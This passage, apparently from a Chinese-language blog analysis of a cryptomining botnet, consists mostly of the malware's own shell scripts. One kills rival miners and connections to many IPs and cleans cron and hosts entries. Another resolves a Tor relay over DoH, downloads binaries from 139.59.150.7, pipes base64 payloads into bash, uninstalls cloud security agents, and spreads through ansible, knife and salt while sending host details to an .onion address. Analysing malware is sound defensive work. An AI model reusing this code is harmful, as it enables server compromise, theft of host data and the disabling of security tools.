class=\"se\">\\-</span><span class=\"s2\">unix|</span><span class=\"se\">\\.\\/</span><span class=\"s2\">oka|</span><span class=\"se\">\\.</span><span class=\"s2\">configrc|</span><span class=\"se\">\\.</span><span class=\"s2\">rsync|</span><span class=\"se\">\\/</span><span class=\"s2\">upd|aliyun|basht|bffbe|curl|jqu</span><span class=\"se\">\\.</span><span class=\"s2\">js|jqu2|kill_virus|virus|kpccv|malware|mazec|nullc|qcloud|rvlss|ryukd|system-python3.8-Updates|systemd-init|th2ps|titanagent|tmp00|ucxin|unixdb|unixoa|wget|wlvly|xzfix|pg_stat|pty3|zsvc|pdefenderd|smcard2|wakuang|delmining|base64\"</span> /etc/cron.<span class=\"k\">*</span>|cut <span class=\"nt\">-f</span> 1 <span class=\"nt\">-d</span> :|xargs <span class=\"nb\">rm</span> <span class=\"nt\">-f</span>\ncrontab <span class=\"nt\">-l</span> |grep <span class=\"nt\">-ivE</span> <span class=\"s2\">\"Evie0EAJrdlD6N9|tEYYDFeOnouIdvpQ|vPUjpEzwu4WUekG|systemd-service|data/pg_|main/pg_|pg_logical|cache/auto|ctlib|70OXQG|Malware|Miner|VUses5|</span><span class=\"se\">\\-</span><span class=\"s2\">unix|</span><span class=\"se\">\\.\\/</span><span class=\"s2\">oka|</span><span class=\"se\">\\.</span><span class=\"s2\">configrc|</span><span class=\"se\">\\.</span><span class=\"s2\">rsync|</span><span class=\"se\">\\/</span><span class=\"s2\">upd|aliyun|basht|bffbe|curl|jqu</span><span class=\"se\">\\.</span><span class=\"s2\">js|jqu2|kill_virus|virus|kpccv|malware|mazec|nullc|qcloud|rvlss|ryukd|system-python3.8-Updates|systemd-init|th2ps|titanagent|tmp00|ucxin|unixdb|unixoa|wget|wlvly|xzfix|pg_stat|pty3|zsvc|pdefenderd|smcard2|wakuang|delmining|base64\"</span> |crontab -\ncrontab <span class=\"nt\">-l</span> |grep <span class=\"nt\">-v</span> <span class=\"s2\">\"[*] [*] [*] [*] [*] /var/lib/pgsql\"</span>|crontab -\ncrontab <span class=\"nt\">-l</span> |grep <span class=\"nt\">-v</span> <span class=\"s2\">\"[*] [*] [*] [*] [*] /var/lib/postgresql\"</span>|crontab -\ncrontab <span class=\"nt\">-l</span> |grep <span class=\"nt\">-v</span> <span class=\"s2\">\"[*] [*] [*] [*] [*] /var/log/postgresql\"</span>|crontab -\ncrontab <span class=\"nt\">-l</span> |grep <span class=\"nt\">-v</span> <span class=\"s2\">\"[*] [*] [*] [*] [*] /etc/postgresql/\"</span>|crontab -\n<span class=\"nb\">grep</span> <span class=\"nt\">-q</span> onion /etc/hosts <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s1\">'/onion/d'</span> /etc/hosts\n<span class=\"nb\">grep</span> <span class=\"nt\">-q</span> tor2w /etc/hosts <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s1\">'/tor2w/d'</span> /etc/hosts\nnetstat <span class=\"nt\">-antp</span>|grep <span class=\"nt\">-E</span> <span class=\"s2\">\"82.114.253.13|14.17.70.144|3.125.10.23|103.53.210.34|45.64.130.147|34.252.195.254|103.3.62.64|104.140.201.42|104.140.244.186|107.178.104.10|107.191.99.221|107.191.99.95|116.203.73.240|131.153.56.98|131.153.76.130|136.243.102.154|138.201.20.89|138.201.27.243|138.201.36.249|139.162.132.70|139.162.60.220|139.162.81.90|139.99.101.197|139.99.101.198|139.99.101.232|139.99.102.70|139.99.102.71|139.99.102.72|139.99.102.73|139.99.102.74|139.99.120.50|139.99.120.75|139.99.123.196|139.99.124.170|139.99.125.38|139.99.156.30|139.99.68.128|142.44.242.100|142.44.243.6|144.217.14.109|144.217.14.139|147.135.37.31|149.202.42.174|149.202.83.171|15.236.100.141|151.80.144.188|158.69.25.62|158.69.25.71|158.69.25.77|163.172.203.178|163.172.206.67|163.172.207.69|163.172.226.114|163.172.226.137|172.104.143.224|172.104.151.232|172.104.159.158|172.104.165.191|172.104.247.21|172.104.76.21|172.105.205.58|172.105.205.68|172.105.210.117|172.105.211.250|172.105.235.97|178.63.100.197|18.180.72.219|18.210.126.40|192.110.160.114|192.99.69.170|195.154.62.247|195.201.12.107|199.231.85.124|207.246.100.198|213.32.29.143|213.32.74.157|217.182.169.148|23.88.160.140|3.0.193.200|37.187.95.110|37.59.43.131|37.59.44.193|37.59.44.93|37.59.54.205|37.59.55.60|37.9.3.26|45.32.71.82|45.76.65.223|45.79.192.137|45.79.200.97|45.79.204.241|45.79.210.48|46.4.120.18|47.101.30.124|5.196.13.29|5.196.23.240|51.15.54.102|51.15.55.100|51.15.55.162|51.15.58.224|51.15.65.182|51.15.67.17|51.15.69.136|51.15.78.68|51.255.34.118|51.255.34.79|51.255.34.80|51.81.245.40|54.188.223.206|54.37.7.208|66.42.105.146|78.46.49.222|78.46.87.181|81.25.55.79|81.91.189.245|88.99.142.163|88.99.193.240|88.99.242.92|91.121.140.167|94.130.12.27|94.130.12.30|94.130.143.162|94.130.165.85|94.130.165.87|94.130.239.15|94.23.23.52|94.23.247.226|95.216.209.67|205.185.118.204|63.250.33.43|185.199.11|139.99.121.227|199.192.30.2|185.156.179.225|45.129.2.107|194.87.102.77|172.83.155.151|185.165.171.78|70.39.125.244|205.185.118.204|54.37.7.208|209.141.38.71|150.107.76.231|107.167.7.226|194.40.243.61|195.3.146.118|20.53.100.173|20.62.240.187|94.130.164.163|45.9.148.117|168.235.88.209|161.97.140.214|193.23.250.136|95.216.46.125|95.181.179.88|104.244.78.33|15.228.36.177|203.107.32.162|194.38.20.199\"</span>|awk <span class=\"o\">{</span><span class=\"s1\">'print $NF'</span><span class=\"o\">}</span> |cut <span class=\"nt\">-d</span>/ <span class=\"nt\">-f1</span>|xargs <span class=\"nb\">kill</span> <span class=\"nt\">-9</span>\npkill <span class=\"nt\">-9</span> <span class=\"nt\">-f</span> <span class=\"s2\">\"kthreaddi|defunct|./cron|./oka|</span><span class=\"se\">\\-</span><span class=\"s2\">unix|/tmp/ddgs|/tmp/idk|/tmp/java|/tmp/keep|/tmp/udevs|/tmp/udk|/tmp/update.sh|/tmp/yarn|/usr/bin/netfs|8220|AliHids|AliSecGuard|AliYunDun|descargars|Donald|HT8s|Jonason|steasec|salt-store|salt-minion|SzdXM|X13-unix|X17-unix|</span><span class=\"se\">\\[</span><span class=\"s2\">stea</span><span class=\"se\">\\]</span><span class=\"s2\">|aegis_|AliYunDun|AliHids|AliHips|AliYunDunUpdate|aliyun-service|azipl|bash64|bigd1ck|cr.sh|crloger|cronds|crun|cryptonight|curn|currn|ddgs|dhcleint|fs-manager|gf128mul|havegeds|httpdz|irqbalanced|JavaUpdate|system-python3.8-Updates|java-c|kaudited|kdevtmpfsi|kerberods|khugepageds|kinsing|kintegrityds|kpsmouseds|swapd0|kswaped|knthread|kthreadds|kthrotlds|kw0|kworkerds|kworkre|kwroker|liog|lsof|lopata|Macron|mewrs|migrations|miner|mmm|mr.sh|muhsti|mygit|netdns|networkservice|orgfs|pamdicks|pastebin|postgresq1|qW3xT|qwefdas|rctlcli|sleep|stratum|sustes|sustse|sysguard|sysguerd|systeamd|systemd-network|sysupdate|sysupdata|t00ls|thisxxs|Trump|update.sh|vTtHH|watchbog|watchbug|watchog|wipefs|wnTKYg|x3Wq|xig|xmr|zer0|zsvc|pdefenderd|smcard2|rcu_sched\"</span>\nps x |grep <span class=\"nt\">-v</span> <span class=\"nb\">grep</span>|grep <span class=\"nt\">-E</span> <span class=\"s2\">\"kthreaddi|defunct|kinsing|kdevtmpfs|./oka|zsvc|pdefenderd|smcard2|swapd0|rcu_sched|AliSecGuard|AliYunDunUpdate|AliYunDun|aliyun-service|assist_daemon\"</span>|awk <span class=\"s1\">'{print $1}'</span> |xargs <span class=\"nt\">-I</span> % <span class=\"nb\">kill</span> <span class=\"nt\">-9</span> %\nss <span class=\"nt\">-antp</span> |grep <span class=\"nt\">-E</span> <span class=\"s2\">\"82.114.253.13|14.17.70.144|3.125.10.23|103.53.210.34|45.64.130.147|34.252.195.254|kinsing|kdevtmpfsi|103.3.62.64|104.140.201.42|104.140.244.186|107.178.104.10|107.191.99.221|107.191.99.95|116.203.73.240|131.153.56.98|131.153.76.130|136.243.102.154|138.201.20.89|138.201.27.243|138.201.36.249|139.162.132.70|139.162.60.220|139.162.81.90|139.99.101.197|139.99.101.198|139.99.101.232|139.99.102.70|139.99.102.71|139.99.102.72|139.99.102.73|139.99.102.74|139.99.120.50|139.99.120.75|139.99.123.196|139.99.124.170|139.99.125.38|139.99.156.30|139.99.68.128|142.44.242.100|142.44.243.6|144.217.14.109|144.217.14.139|147.135.37.31|149.202.42.174|149.202.83.171|15.236.100.141|151.80.144.188|158.69.25.62|158.69.25.71|158.69.25.77|163.172.203.178|163.172.206.67|163.172.207.69|163.172.226.114|163.172.226.137|172.104.143.224|172.104.151.232|172.104.159.158|172.104.165.191|172.104.247.21|172.104.76.21|172.105.205.58|172.105.205.68|172.105.210.117|172.105.211.250|172.105.235.97|178.63.100.197|18.180.72.219|18.210.126.40|192.110.160.114|192.99.69.170|195.154.62.247|195.201.12.107|199.231.85.124|207.246.100.198|213.32.29.143|213.32.74.157|217.182.169.148|23.88.160.140|3.0.193.200|37.187.95.110|37.59.43.131|37.59.44.193|37.59.44.93|37.59.54.205|37.59.55.60|37.9.3.26|45.32.71.82|45.76.65.223|45.79.192.137|45.79.200.97|45.79.204.241|45.79.210.48|46.4.120.18|47.101.30.124|5.196.13.29|5.196.23.240|51.15.54.102|51.15.55.100|51.15.55.162|51.15.58.224|51.15.65.182|51.15.67.17|51.15.69.136|51.15.78.68|51.255.34.118|51.255.34.79|51.255.34.80|51.81.245.40|54.188.223.206|54.37.7.208|66.42.105.146|78.46.49.222|78.46.87.181|81.25.55.79|81.91.189.245|88.99.142.163|88.99.193.240|88.99.242.92|91.121.140.167|94.130.12.27|94.130.12.30|94.130.143.162|94.130.165.85|94.130.165.87|94.130.239.15|94.23.23.52|94.23.247.226|95.216.209.67|205.185.118.204|63.250.33.43|185.199.11|139.99.121.227|199.192.30.2|185.156.179.225|45.129.2.107|194.87.102.77|172.83.155.151|185.165.171.78|70.39.125.244|205.185.118.204|54.37.7.208|209.141.38.71|150.107.76.231|107.167.7.226|194.40.243.61|195.3.146.118|20.53.100.173|20.62.240.187|94.130.164.163|45.9.148.117|168.235.88.209|161.97.140.214|193.23.250.136|95.216.46.125|95.181.179.88|104.244.78.33|15.228.36.177|203.107.32.162|194.38.20.199\"</span> |awk <span class=\"nt\">-F</span>, <span class=\"o\">{</span><span class=\"s1\">'print $(NF-1)'</span><span class=\"o\">}</span>|sed <span class=\"s1\">'s/pid=//g'</span> |xargs <span class=\"nb\">kill</span> <span class=\"nt\">-9</span> \n<span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$HOME</span>/.<span class=\"o\">{</span>Evie0EAJrdlD6N9,tEYYDFeOnouIdvpQ,vPUjpEzwu4WUekGs,systemd-service<span class=\"o\">}</span>.sh\n<span class=\"nb\">rm</span> <span class=\"nt\">-f</span> /opt/.<span class=\"o\">{</span>Evie0EAJrdlD6N9,tEYYDFeOnouIdvpQ,vPUjpEzwu4WUekGs,systemd-service<span class=\"o\">}</span>.sh\nps ax <span class=\"nt\">-o</span> <span class=\"s2\">\"pid %cpu cmd\"</span>|grep bash|awk <span class=\"s1\">'{if($2&gt;=20.0) print $1}'</span>|xargs <span class=\"nb\">kill</span> <span class=\"nt\">-9</span>\n\n</code></pre></div></div>\n\n<p>上面这个脚本，我一直没有看太懂想干嘛，看起来像是在清理痕迹，灾后重建，又像是在清理竞争对手的挖矿木马，我没看懂他想干嘛，先跳过吧。</p>\n\n<p>还有一段比较有趣的脚本。这看起来应该就是和前面 zscaler 提到的横向移动的功能了。</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>nU9WagjQ8BenWPXt0ovE12uD8jBItv6\n<span class=\"nb\">exec</span> &amp;&gt;/dev/null\n<span class=\"nb\">export </span><span class=\"nv\">PATH</span><span class=\"o\">=</span><span class=\"nv\">$PATH</span>:<span class=\"nv\">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\n\n<span class=\"nv\">d</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">grep </span>x:<span class=\"si\">$(</span><span class=\"nb\">id</span> <span class=\"nt\">-u</span><span class=\"si\">)</span>: /etc/passwd|cut <span class=\"nt\">-d</span>: <span class=\"nt\">-f6</span><span class=\"si\">)</span>\n<span class=\"nv\">c</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"curl -4fsSLkA- -m200\"</span><span class=\"si\">)</span>\n<span class=\"nv\">t</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad\"</span><span class=\"si\">)</span>\n\nsockz<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"nv\">n</span><span class=\"o\">=(</span>doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com <span class=\"k\">fi</span>.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch<span class=\"o\">)</span>\n<span class=\"nv\">p</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"dns-query?name=relay.tor2socks.in\"</span><span class=\"si\">)</span>\n<span class=\"nv\">s</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nv\">$c</span> https://<span class=\"k\">${</span><span class=\"nv\">n</span><span class=\"p\">[</span><span class=\"k\">$((</span>RANDOM%11<span class=\"k\">))</span><span class=\"p\">]</span><span class=\"k\">}</span>/<span class=\"nv\">$p</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-oE</span> <span class=\"s2\">\"</span><span class=\"se\">\\b</span><span class=\"s2\">([0-9]{1,3}</span><span class=\"se\">\\.</span><span class=\"s2\">){3}[0-9]{1,3}</span><span class=\"se\">\\b</span><span class=\"s2\">\"</span> |tr <span class=\"s1\">' '</span> <span class=\"s1\">'\\n'</span>|grep <span class=\"nt\">-Ev</span> <span class=\"o\">[</span>.]0|sort <span class=\"nt\">-uR</span>|head <span class=\"nt\">-n</span> 1<span class=\"si\">)</span>\n<span class=\"o\">}</span>\n\nfexe<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"nb\">.</span> <span class=\"nv\">$HOME</span> /usr/bin <span class=\"nv\">$d</span> /tmp /var/tmp <span class=\"p\">;</span><span class=\"k\">do </span><span class=\"nb\">echo exit</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">chmod</span> +x <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cd</span> <span class=\"nv\">$i</span> <span class=\"o\">&amp;&amp;</span> ./i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">rm</span> <span class=\"nt\">-f</span> i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break</span><span class=\"p\">;</span><span class=\"k\">done</span>\n<span class=\"o\">}</span>\n\nisys<span class=\"o\">()</span> <span class=\"o\">{</span> \n<span class=\"nb\">echo </span>ZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOnKICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMK|base64 <span class=\"nt\">-d</span>|bash\ncrontab <span class=\"nt\">-l</span> <span class=\"o\">||</span> yum <span class=\"nt\">-y</span> <span class=\"nb\">install </span>cron\ncrontab <span class=\"nt\">-l</span> <span class=\"o\">||</span> yum <span class=\"nt\">-y</span> <span class=\"nb\">install </span>cronie\ncrontab <span class=\"nt\">-l</span> <span class=\"o\">||</span> apt-get update <span class=\"o\">&amp;&amp;</span> apt-get <span class=\"nt\">-y</span> <span class=\"nb\">install </span>cron\n/usr/local/share/assist-daemon/assist_daemon <span class=\"nt\">--stop</span>\n/usr/local/share/assist-daemon/assist_daemon <span class=\"nt\">--delete</span>\n/usr/local/qcloud/monitor/barad/admin/uninstall.sh\n/usr/local/qcloud/stargate/admin/uninstall.sh\n/usr/local/qcloud/YunJing/uninst.sh\n/etc/init.d/aegis uninstall\nsystemctl stop aliyun\nsystemctl disable aliyun\nsystemctl start cron\nsystemctl <span class=\"nb\">enable </span>cron\nsystemctl start crond\nsystemctl <span class=\"nb\">enable </span>crond\n<span class=\"nb\">rm</span> <span class=\"nt\">-rf</span> /usr/loca/qcloud/ /usr/local/aegis/ /usr/local/share/assist-daemon/ /usr/local/share/aliyun-assist/ /usr/sbin/aliyun-service /usr/sbin/aliyun_installer /etc/systemd/system/aliyun.service\n<span class=\"o\">}</span>\n\nissh<span class=\"o\">()</span> <span class=\"o\">{</span>\nansible all <span class=\"nt\">-m</span> shell <span class=\"nt\">-a</span> <span class=\"s1\">'echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash'</span>\nknife ssh <span class=\"s1\">'name:*'</span> <span class=\"s1\">'echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash'</span>\nsalt <span class=\"s1\">'*'</span> cmd.run <span class=\"s1\">'echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRo